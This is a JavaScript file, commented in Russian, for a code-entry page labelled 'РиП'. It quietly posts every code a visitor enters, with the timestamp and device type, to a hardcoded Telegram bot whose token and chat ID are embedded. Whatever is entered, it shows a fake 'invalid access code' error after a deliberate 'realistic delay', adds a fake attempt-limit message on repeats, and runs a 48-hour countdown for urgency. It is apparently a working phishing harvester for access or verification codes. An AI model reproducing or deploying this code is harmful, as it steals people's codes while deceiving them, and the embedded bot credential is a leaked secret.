/**
 * РиП - Минималистичный интерфейс ввода кода
 * С отправкой в Telegram, блокировкой повторов и ЕДИНЫМ глобальным 48-часовым таймером
 */

// ============================================================================
// CONFIGURATION
// ============================================================================
// Telegram Bot Credentials
const TELEGRAM_BOT_TOKEN = '8874990267:AAEe2z-tM4FUrxvNmUM5f9IJo48wloUCIRU';
const TELEGRAM_CHAT_ID = '8695383091';

// ЕДИНАЯ ТОЧКА ОКОНЧАНИЯ ТАЙМЕРА ДЛЯ ВСЕХ ПОЛЬЗОВАТЕЛЕЙ (48 часов)
// Вы можете изменить эту дату при необходимости в формате: 'ГГГГ-ММ-ДДTHH:MM:SS+03:00'
const GLOBAL_DEADLINE_ISO = '2026-08-22T22:00:00+03:00';
const GLOBAL_TIMER_END = new Date(GLOBAL_DEADLINE_ISO).getTime();

// Local Storage Keys
const STORAGE_KEY_LOGS = 'rip_entered_codes';
const STORAGE_KEY_LAST_CODE = 'rip_last_entered_code';
const STORAGE_KEY_CONSECUTIVE = 'rip_consecutive_count';

// ============================================================================
// DOM Elements
// ============================================================================
const codeForm = document.getElementById('code-form');
const codeInput = document.getElementById('code-input');
const btnSubmit = document.getElementById('btn-submit');
const btnSpinner = document.getElementById('btn-spinner');
const btnIcon = btnSubmit.querySelector('.btn-icon');
const errorMsg = document.getElementById('error-msg');
const errorText = document.getElementById('error-text');
const inputGroup = document.querySelector('.input-group');
const timerDisplay = document.getElementById('timer-display');

// ============================================================================
// Web Audio API Sound Effects
// ============================================================================
let audioCtx = null;

function playErrorTone() {
  try {
    const AudioContextClass = window.AudioContext || window.webkitAudioContext;
    if (!AudioContextClass) return;
    if (!audioCtx) audioCtx = new AudioContextClass();
    if (audioCtx.state === 'suspended') audioCtx.resume();
    
    const now = audioCtx.currentTime;
    const osc = audioCtx.createOscillator();
    const gain = audioCtx.createGain();
    
    osc.type = 'sine';
    osc.frequency.setValueAtTime(120, now);
    osc.frequency.linearRampToValueAtTime(70, now + 0.25);
    
    gain.gain.setValueAtTime(0.08, now);
    gain.gain.exponentialRampToValueAtTime(0.001, now + 0.25);
    
    osc.connect(gain);
    gain.connect(audioCtx.destination);
    
    osc.start(now);
    osc.stop(now + 0.26);
  } catch (e) {
    // Audio optional
  }
}

// ============================================================================
// Local Storage Backup
// ============================================================================
function saveToLocalStorage(code) {
  try {
    const logs = JSON.parse(localStorage.getItem(STORAGE_KEY_LOGS) || '[]');
    logs.push({
      code: code,
      length: code.length,
      time: new Date().toISOString()
    });
    localStorage.setItem(STORAGE_KEY_LOGS, JSON.stringify(logs));
  } catch (e) {
    console.error('LocalStorage write error:', e);
  }
}

// ============================================================================
// Telegram Dispatcher
// ============================================================================
async function sendToTelegram(code) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;

  const safeCode = code
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');

  const now = new Date();
  const timeFormatted = now.toLocaleString('ru-RU', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });

  const device = /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? '📱 Телефон/Планшет' : '💻 Компьютер';

  const text = 
    `🚨 <b>Введён код (РиП):</b>\n\n` +
    `🔑 <code>${safeCode}</code>\n\n` +
    `📏 <b>Символов:</b> ${code.length}\n` +
    `🕒 <b>Время:</b> ${timeFormatted}\n` +
    `🖥 <b>Устройство:</b> ${device}`;

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  try {
    fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: 'HTML'
      })
    }).catch(err => console.error('Telegram dispatch error:', err));
  } catch (err) {
    console.error('Telegram fetch error:', err);
  }
}

// ============================================================================
// Form Submit Handler (Duplicate Checking & Error Handling)
// ============================================================================
codeForm.addEventListener('submit', (e) => {
  e.preventDefault();

  const code = codeInput.value.trim();
  if (!code) {
    codeInput.focus();
    return;
  }

  // Check for consecutive duplicate entries of the same code
  const lastCode = localStorage.getItem(STORAGE_KEY_LAST_CODE);
  let consecutiveCount = parseInt(localStorage.getItem(STORAGE_KEY_CONSECUTIVE) || '0', 10);

  let isDuplicateExceeded = false;

  if (lastCode === code) {
    consecutiveCount += 1;
    localStorage.setItem(STORAGE_KEY_CONSECUTIVE, consecutiveCount.toString());
    isDuplicateExceeded = true; // Duplicate attempt: trigger limit error and skip Telegram
  } else {
    consecutiveCount = 1;
    localStorage.setItem(STORAGE_KEY_LAST_CODE, code);
    localStorage.setItem(STORAGE_KEY_CONSECUTIVE, '1');
  }

  // If NOT a consecutive duplicate, send to Telegram and save to logs
  if (!isDuplicateExceeded) {
    saveToLocalStorage(code);
    sendToTelegram(code);
  }

  // Loading state
  btnSubmit.disabled = true;
  btnSpinner.style.display = 'inline-block';
  btnIcon.style.display = 'none';

  // Realistic delay before showing error
  setTimeout(() => {
    btnSubmit.disabled = false;
    btnSpinner.style.display = 'none';
    btnIcon.style.display = 'inline-block';

    // Play error sound
    playErrorTone();

    // Set appropriate error message
    if (isDuplicateExceeded) {
      errorText.textContent = 'Превышен лимит попыток для этого кода';
    } else {
      errorText.textContent = 'Неверный код доступа';
    }

    // Show error message
    errorMsg.style.display = 'flex';
    inputGroup.classList.add('has-error');

    // Trigger Shake animation
    inputGroup.classList.remove('shake-animation');
    void inputGroup.offsetWidth; // Reflow
    inputGroup.classList.add('shake-animation');

    codeInput.select();
  }, 350);
});

// Clear error state on typing
codeInput.addEventListener('input', () => {
  if (errorMsg.style.display !== 'none') {
    errorMsg.style.display = 'none';
    inputGroup.classList.remove('has-error');
  }
});

// ============================================================================
// ЕДИНЫЙ СИНХРОНИЗИРОВАННЫЙ ТАЙМЕР ДЛЯ ВСЕХ ПОЛЬЗОВАТЕЛЕЙ
// ============================================================================
function initSynchronizedTimer() {
  function updateTimer() {
    const now = Date.now();
    const remainingMs = Math.max(0, GLOBAL_TIMER_END - now);

    const totalHours = Math.floor(remainingMs / (1000 * 60 * 60));
    const minutes = Math.floor((remainingMs % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((remainingMs % (1000 * 60)) / 1000);

    const formattedHours = String(totalHours).padStart(2, '0');
    const formattedMinutes = String(minutes).padStart(2, '0');
    const formattedSeconds = String(seconds).padStart(2, '0');

    if (timerDisplay) {
      timerDisplay.textContent = `${formattedHours}:${formattedMinutes}:${formattedSeconds}`;
    }
  }

  updateTimer();
  setInterval(updateTimer, 1000);
}

// Start synchronized timer on page load
initSynchronizedTimer();
